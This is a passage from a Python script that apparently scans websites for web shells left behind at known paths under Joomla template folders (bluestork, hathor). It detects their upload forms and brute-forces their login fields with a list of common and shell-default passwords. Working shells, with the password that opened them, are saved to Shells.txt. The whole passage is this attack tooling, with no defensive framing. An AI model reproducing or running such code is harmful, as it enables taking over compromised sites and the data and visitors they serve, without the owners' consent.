											if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
												print(' # '+site +'/ --> {}[bluestork]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH1_J+'#t00r')
											else :
												p123 = requests.post(SH1_J,data=password_123,timeout=15).content
												if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
													print(' # '+site +'/ --> {}[bluestork]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH1_J+'#123')
												else :
													p1234 = requests.post(SH1_J,data=password_1234,timeout=15).content
													if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
														print(' # '+site +'/ --> {}[bluestork]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH1_J+'#1234')
													else :
														p12345 = requests.post(SH1_J,data=password_12345,timeout=15).content
														if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
															print(' # '+site +'/ --> {}[bluestork]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH1_J+'#12345')
														else :
															p123456 = requests.post(SH1_J,data=password_123456,timeout=15).content
															if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH1_J+'#123456')
															else :
																p123123 = requests.post(SH1_J,data=password_123123,timeout=15).content
																if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																	print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH1_J+'#123123')
																else :
																	p123321 = requests.post(SH1_J,data=password_123321,timeout=15).content
																	if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																		print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH1_J+'#123321')
																	else :
																		p123456789 = requests.post(SH1_J,data=password_123456789,timeout=15).content
																		if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																			print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH1_J+'#123456789')
																		else :
																			p1234567890 = requests.post(SH1_J,data=password_1234567890,timeout=15).content
																			if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																				print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH1_J+'#1234567890')
																			else :
																				phaurgeulis = requests.post(SH1_J,data=password_haurgeulis,timeout=15).content
																				if 'Andela1C3' in phaurgeulis  :
																					print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH1_J+'#haurgeulis')
																				else :
																					print(' # '+site +' --> {}[Failed]'.format(fr))
						else :
							SH2_J_content = requests.get(SH2_J,timeout=15).content
							if ' type="file"' in SH2_J_content or ' type=\'file\'' in SH2_J_content or ' type= "file"' in SH2_J_content or ' type= \'file\'' in SH2_J_content or ' type = "file"' in SH2_J_content or ' type = \'file\'' in SH2_J_content or ' type ="file"' in SH2_J_content or ' type =\'file\'' in SH2_J_content or ' type=file' in SH2_J_content or ' type =file' in SH2_J_content or ' type= file' in SH2_J_content or ' type = file' in SH2_J_content or 'Upload</a> ]</li><li>[' in SH2_J_content or 'upload</a><li><a>Sym' in SH2_J_content :
								print(' # '+site +'/ --> {}[bluestork]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH2_J+'')
							elif ' name=pass' in SH2_J_content :
								nhzgrf = requests.post(SH2_J,data=password_nhzgrf,timeout=15).content
								if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
									print(' # '+site +'/ --> {}[bluestork]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH2_J+'#nhzgrf')
								else :
									proot = requests.post(SH2_J,data=password_root,timeout=15).content
									if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
										print(' # '+site +'/ --> {}[bluestork]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH2_J+'#root')
									else :
										pr00t = requests.post(SH2_J,data=password_r00t,timeout=15).content
										if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
											print(' # '+site +'/ --> {}[bluestork]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH2_J+'#r00t')
										else :
											padmin = requests.post(SH2_J,data=password_admin,timeout=15).content
											if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
												print(' # '+site +'/ --> {}[bluestork]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH2_J+'#admin')
											else :
												pt00r = requests.post(SH2_J,data=password_t00r,timeout=15).content
												if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
													print(' # '+site +'/ --> {}[bluestork]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH2_J+'#t00r')
												else :
													p123 = requests.post(SH2_J,data=password_123,timeout=15).content
													if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
														print(' # '+site +'/ --> {}[bluestork]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH2_J+'#123')
													else :
														p1234 = requests.post(SH2_J,data=password_1234,timeout=15).content
														if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
															print(' # '+site +'/ --> {}[bluestork]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH2_J+'#1234')
														else :
															p12345 = requests.post(SH2_J,data=password_12345,timeout=15).content
															if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH2_J+'#12345')
															else :
																p123456 = requests.post(SH2_J,data=password_123456,timeout=15).content
																if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																	print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH2_J+'#123456')
																else :
																	p123123 = requests.post(SH2_J,data=password_123123,timeout=15).content
																	if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																		print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH2_J+'#123123')
																	else :
																		p123321 = requests.post(SH2_J,data=password_123321,timeout=15).content
																		if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																			print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH2_J+'#123321')
																		else :
																			p123456789 = requests.post(SH2_J,data=password_123456789,timeout=15).content
																			if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																				print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH2_J+'#123456789')
																			else :
																				p1234567890 = requests.post(SH2_J,data=password_1234567890,timeout=15).content
																				if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																					print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH2_J+'#1234567890')
																				else :
																					phaurgeulis = requests.post(SH2_J,data=password_haurgeulis,timeout=15).content
																					if 'Andela1C3' in phaurgeulis  :
																						print(' # '+site +'/ --> {}[bluestork]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH2_J+'#haurgeulis')
																					else :
																						print(' # '+site +' --> {}[Failed]'.format(fr))
							else :
								SH3_J_content = requests.get(SH3_J,timeout=15).content
								if ' type="file"' in SH3_J_content or ' type=\'file\'' in SH3_J_content or ' type= "file"' in SH3_J_content or ' type= \'file\'' in SH3_J_content or ' type = "file"' in SH3_J_content or ' type = \'file\'' in SH3_J_content or ' type ="file"' in SH3_J_content or ' type =\'file\'' in SH3_J_content or ' type=file' in SH3_J_content or ' type =file' in SH3_J_content or ' type= file' in SH3_J_content or ' type = file' in SH3_J_content or 'Upload</a> ]</li><li>[' in SH3_J_content or 'upload</a><li><a>Sym' in SH3_J_content :
									print(' # '+site +'/ --> {}[hathor]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH3_J+'')
								elif ' name=pass' in SH3_J_content :
									nhzgrf = requests.post(SH3_J,data=password_nhzgrf,timeout=15).content
									if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
										print(' # '+site +'/ --> {}[hathor]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH3_J+'#nhzgrf')
									else :
										proot = requests.post(SH3_J,data=password_root,timeout=15).content
										if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
											print(' # '+site +'/ --> {}[hathor]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH3_J+'#root')
										else :
											pr00t = requests.post(SH3_J,data=password_r00t,timeout=15).content
											if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
												print(' # '+site +'/ --> {}[hathor]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH3_J+'#r00t')
											else :
												padmin = requests.post(SH3_J,data=password_admin,timeout=15).content
												if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
													print(' # '+site +'/ --> {}[hathor]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH3_J+'#admin')
												else :
													pt00r = requests.post(SH3_J,data=password_t00r,timeout=15).content
													if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
														print(' # '+site +'/ --> {}[hathor]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH3_J+'#t00r')
													else :
														p123 = requests.post(SH3_J,data=password_123,timeout=15).content
														if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
															print(' # '+site +'/ --> {}[hathor]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH3_J+'#123')
														else :
															p1234 = requests.post(SH3_J,data=password_1234,timeout=15).content
															if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																print(' # '+site +'/ --> {}[hathor]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH3_J+'#1234')
															else :
																p12345 = requests.post(SH3_J,data=password_12345,timeout=15).content
																if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																	print(' # '+site +'/ --> {}[hathor]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH3_J+'#12345')
																else :
																	p123456 = requests.post(SH3_J,data=password_123456,timeout=15).content
																	if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																		print(' # '+site +'/ --> {}[hathor]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH3_J+'#123456')
																	else :
																		p123123 = requests.post(SH3_J,data=password_123123,timeout=15).content
																		if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																			print(' # '+site +'/ --> {}[hathor]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH3_J+'#123123')
																		else :
																			p123321 = requests.post(SH3_J,data=password_123321,timeout=15).content
																			if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																				print(' # '+site +'/ --> {}[hathor]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH3_J+'#123321')
																			else :
																				p123456789 = requests.post(SH3_J,data=password_123456789,timeout=15).content
																				if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																					print(' # '+site +'/ --> {}[hathor]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH3_J+'#123456789')
																				else :
																					p1234567890 = requests.post(SH3_J,data=password_1234567890,timeout=15).content
																					if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																						print(' # '+site +'/ --> {}[hathor]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH3_J+'#1234567890')
																					else :
																						phaurgeulis = requests.post(SH3_J,data=password_haurgeulis,timeout=15).content
																						if 'Andela1C3' in phaurgeulis  :
																							print(' # '+site +'/ --> {}[hathor]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH3_J+'#haurgeulis')
																						else :
																							print(' # '+site +' --> {}[Failed]'.format(fr))
								else :
									SH4_J_content = requests.get(SH4_J,timeout=15).content
									if ' type="file"' in SH4_J_content or ' type=\'file\'' in SH4_J_content or ' type= "file"' in SH4_J_content or ' type= \'file\'' in SH4_J_content or ' type = "file"' in SH4_J_content or ' type = \'file\'' in SH4_J_content or ' type ="file"' in SH4_J_content or ' type =\'file\'' in SH4_J_content or ' type=file' in SH4_J_content or ' type =file' in SH4_J_content or ' type= file' in SH4_J_content or ' type = file' in SH4_J_content or 'Upload</a> ]</li><li>[' in SH4_J_content or 'upload</a><li><a>Sym' in SH4_J_content :
										print(' # '+site +'/ --> {}[hathor]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH4_J+'')
									elif ' name=pass' in SH4_J_content :
										nhzgrf = requests.post(SH4_J,data=password_nhzgrf,timeout=15).content
										if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
											print(' # '+site +'/ --> {}[hathor]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH4_J+'#nhzgrf')
										else :
											proot = requests.post(SH4_J,data=password_root,timeout=15).content
											if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
												print(' # '+site +'/ --> {}[hathor]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH4_J+'#root')
											else :
												pr00t = requests.post(SH4_J,data=password_r00t,timeout=15).content
												if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
													print(' # '+site +'/ --> {}[hathor]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH4_J+'#r00t')
												else :
													padmin = requests.post(SH4_J,data=password_admin,timeout=15).content
													if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
														print(' # '+site +'/ --> {}[hathor]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH4_J+'#admin')
													else :
														pt00r = requests.post(SH4_J,data=password_t00r,timeout=15).content
														if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
															print(' # '+site +'/ --> {}[hathor]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH4_J+'#t00r')
														else :
															p123 = requests.post(SH4_J,data=password_123,timeout=15).content
															if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																print(' # '+site +'/ --> {}[hathor]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH4_J+'#123')
															else :
																p1234 = requests.post(SH4_J,data=password_1234,timeout=15).content
																if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																	print(' # '+site +'/ --> {}[hathor]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH4_J+'#1234')
																else :
																	p12345 = requests.post(SH4_J,data=password_12345,timeout=15).content
																	if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																		print(' # '+site +'/ --> {}[hathor]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH4_J+'#12345')
																	else :
																		p123456 = requests.post(SH4_J,data=password_123456,timeout=15).content
																		if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																			print(' # '+site +'/ --> {}[hathor]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH4_J+'#123456')
																		else :
																			p123123 = requests.post(SH4_J,data=password_123123,timeout=15).content
																			if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																				print(' # '+site +'/ --> {}[hathor]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH4_J+'#123123')
																			else :
																				p123321 = requests.post(SH4_J,data=password_123321,timeout=15).content
																				if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																					print(' # '+site +'/ --> {}[hathor]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH4_J+'#123321')
																				else :
																					p123456789 = requests.post(SH4_J,data=password_123456789,timeout=15).content
																					if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																						print(' # '+site +'/ --> {}[hathor]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH4_J+'#123456789')
																					else :
																						p1234567890 = requests.post(SH4_J,data=password_1234567890,timeout=15).content
																						if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																							print(' # '+site +'/ --> {}[hathor]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH4_J+'#1234567890')
																						else :
																							phaurgeulis = requests.post(SH4_J,data=password_haurgeulis,timeout=15).content
																							if 'Andela1C3' in phaurgeulis  :
																								print(' # '+site +'/ --> {}[hathor]'.format(fg))
